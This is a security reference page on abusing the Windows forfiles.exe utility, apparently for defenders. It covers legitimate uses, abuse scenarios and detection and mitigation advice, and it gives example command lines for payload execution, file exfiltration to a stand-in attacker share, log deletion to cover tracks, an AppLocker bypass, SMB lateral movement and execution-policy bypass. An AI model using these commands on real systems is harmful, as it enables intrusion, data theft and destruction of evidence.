# forfiles.exe
## What is it?
*```forfiles.exe``` is a built-in Windows command-line utility used for selecting files and executing commands on them based on specific criteria such as date, size, or name pattern.*
*It is often used in batch files and scripts to automate file management tasks such as archiving, deleting, or processing files in a specified directory.*

## Legitimate Usage
- **File Management Automation** → Automate tasks like file cleanup, archiving, or copying.
- **Scheduled File Operations** → Combine with Task Scheduler to perform periodic operations on files (e.g., delete old files).
- **System Maintenance** → Delete old logs, backup files, or temporary files after a certain period.
- **Batch File Processing** → Execute commands on groups of files with specific patterns or properties.

## How to abuse it
- **Persistence** → Attackers can use ```forfiles.exe``` to schedule malicious scripts or programs to run at regular intervals.
- **Automated Exfiltration** → Attackers can automate the copying or deletion of sensitive files at scheduled times.
- **Bypassing Security Controls** → Use trusted Windows binaries to perform unauthorized actions without triggering security alerts.
- **Privilege Escalation** → Attackers can leverage ```forfiles.exe``` to execute malicious scripts that elevate privileges via scheduled tasks or specific file conditions.

## Example attacks
### 1. Persistence via Scheduled Task
*Attackers can use ```forfiles.exe``` to schedule the execution of a malicious script or payload.*
**Schedule Malicious Payload Execution**

```
forfiles /p C:\ /s /m *.exe /d +0 /c "cmd /c C:\path\to\malicious_payload.exe"
```

**Effect:**
- ```forfiles.exe``` runs a command (in this case, executing a malicious payload) on files that meet the specified criteria (e.g., all `.exe` files).
- The command can be scheduled to run periodically, ensuring persistence.

### 2. Exfiltration of Files via Scheduled Task
*Attackers can automate the copying of sensitive files to an external location for exfiltration.*
**Automate File Exfiltration**

```
forfiles /p C:\SensitiveData /s /m *.txt /c "cmd /c copy @file \attacker-server\exfil"
```

**Effect:**
- Automatically copies all `.txt` files from the target directory to a remote share controlled by the attacker.

### 3. File Deletion for Evidence Erasure
*```forfiles.exe``` can be used to schedule the deletion of sensitive files or logs to cover tracks.*
**Automate File Deletion**

```
forfiles /p C:\Windows\Temp /s /m *.log /c "cmd /c del @file"
```

**Effect:**
- Deletes all `.log` files in the `C:\Windows\Temp` directory, which may contain evidence of an attack.

### 4. Bypassing AppLocker and SRP via Scheduled Execution
*```forfiles.exe``` can be used to bypass AppLocker or Software Restriction Policies (SRP) by running executables in trusted directories.*
**Run Executable in Trusted Directory**

```
forfiles /p C:\Windows\System32 /s /m *.exe /c "cmd /c C:\Windows\System32\trusted_payload.exe"
```

**Effect:**
- Executes a payload from a whitelisted directory, bypassing security restrictions on unauthorized file execution.

### 5. Automating Lateral Movement
*Use ```forfiles.exe``` to move files to other systems or directories as part of a lateral movement attack.*
**Automate Lateral Movement via SMB**

```
forfiles /p C:\Users\ /s /m *.exe /c "cmd /c copy @file \192.168.1.50\C$\Windows\Temp"
```

**Effect:**
- Copies malicious executables from one machine to another via SMB, enabling lateral movement across the network.

### 6. Scheduled Execution of Malicious PowerShell Scripts
*```forfiles.exe``` can be used to automate the execution of malicious PowerShell scripts.*
**Run PowerShell Script via Forfiles**

```
forfiles /p C:\ /s /m *.ps1 /c "cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\path\to\malicious_script.ps1"
```

**Effect:**
- Executes a PowerShell script on targeted systems, bypassing execution policy restrictions.

# Detection & Mitigation
## Detection Methods
**Monitor Scheduled Task Creation**
- **Event ID 4698 (Scheduled Task Created)** → Detect the creation of scheduled tasks that execute unusual commands, such as the use of ```forfiles.exe``` with suspicious arguments.
- **Look for Suspicious Command-Line Arguments** → Watch for ```forfiles.exe``` running commands that are not typically used for file management.

**Monitor File Deletions and Modifications**
- **Event ID 4663 (File Accessed)** → Track file deletions or modifications in directories commonly targeted for evidence erasure, such as `C:\Windows\Temp` or user profile directories.
- **Look for High Volume of File Operations** → Multiple file manipulations in a short period could indicate abuse of ```forfiles.exe``` for exfiltration or cleanup.

**Monitor Network Shares**
- **Event ID 5140 (File Share Access)** → Detect unusual file access over SMB, such as large volumes of files being copied to remote locations.

## Mitigation Strategies
- **Use Application Whitelisting** → Prevent the execution of unauthorized scripts and executables, particularly via tools like AppLocker or WDAC.
- **Monitor Scheduled Task Creation** → Set up alerts for any new scheduled task that executes commands involving ```forfiles.exe``` or other tools typically used in lateral movement or persistence.
- **Restrict File Access** → Limit write permissions for sensitive directories and files to trusted administrators only.
- **Control Network Access** → Restrict SMB and other remote access protocols to known and trusted IP addresses to prevent data exfiltration over the network.
- **File Integrity Monitoring** → Implement file integrity monitoring to detect unauthorized file changes or deletions, particularly in critical system directories.
